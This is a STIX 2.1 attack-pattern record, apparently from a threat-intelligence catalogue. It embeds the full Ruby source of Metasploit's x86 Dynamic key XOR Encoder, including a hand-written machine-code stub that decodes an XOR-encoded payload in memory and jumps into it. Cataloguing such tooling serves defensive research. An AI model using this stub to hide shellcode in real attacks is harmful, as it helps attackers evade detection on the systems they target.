{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--240eb1df-2253-4a2d-8ee4-8b093a02f283",
    "created": "2024-08-14T16:33:19.207464Z",
    "modified": "2024-08-14T16:33:19.207468Z",
    "name": "Dynamic key XOR Encoder",
    "description": "An x86 XOR encoder with dynamic key size",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/xor_dynamic.rb",
            "external_id": "xor_dynamic.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::XorDynamic\n\n  def initialize\n    super(\n      'Name'             => 'Dynamic key XOR Encoder',\n      'Description'      => 'An x86 XOR encoder with dynamic key size',\n      'Author'           => [ 'lupman', 'phra' ],\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE\n      )\n  end\n\n  # Indicate that this module can preserve some registers\n  # ...which is currently not true. This is a temp fix\n  # until the full preserve_registers functionality is\n  # implemented.\n  def can_preserve_registers?\n    true\n  end\n\n  def stub\n    \"\\xeb\\x23\" +             #        jmp    _call\n    \"\\x5b\" +                 # _ret:  pop    ebx\n    \"\\x89\\xdf\" +             #        mov    edi, ebx\n    \"\\xb0\\x41\" +             #        mov    al, 'A'\n    \"\\xfc\" +                 #        cld\n    \"\\xae\" +                 # _lp1:  scas   al, BYTE PTR es:[edi]\n    \"\\x75\\xfd\" +             #        jne    _lp1\n    \"\\x89\\xf9\" +             #        mov    ecx, edi\n    \"\\x89\\xde\" +             # _lp2:  mov    esi, ebx\n    \"\\x8a\\x06\" +             # _lp3:  mov    al, BYTE PTR [esi]\n    \"\\x30\\x07\" +             #        xor    BYTE PTR [edi], al\n    \"\\x47\" +                 #        inc    edi\n    \"\\x66\\x81\\x3f\\x42\\x42\" + #        cmp    WORD PTR [edi], 'BB'\n    \"\\x74\\x08\" +             #        je     _jmp\n    \"\\x46\" +                 #        inc    esi\n    \"\\x80\\x3e\\x41\" +         #        cmp    BYTE PTR [esi], 'A'\n    \"\\x75\\xee\" +             #        jne    _lp3\n    \"\\xeb\\xea\" +             #        jmp    _lp2\n    \"\\xff\\xe1\" +             # _jmp:  jmp    ecx\n    \"\\xe8\\xd8\\xff\\xff\\xff\"   # _call: call   _ret\n  end\n\n  def stub_key_term\n    /A/\n  end\n\n  def stub_payload_term\n    /BB/\n  end\nend\n"
}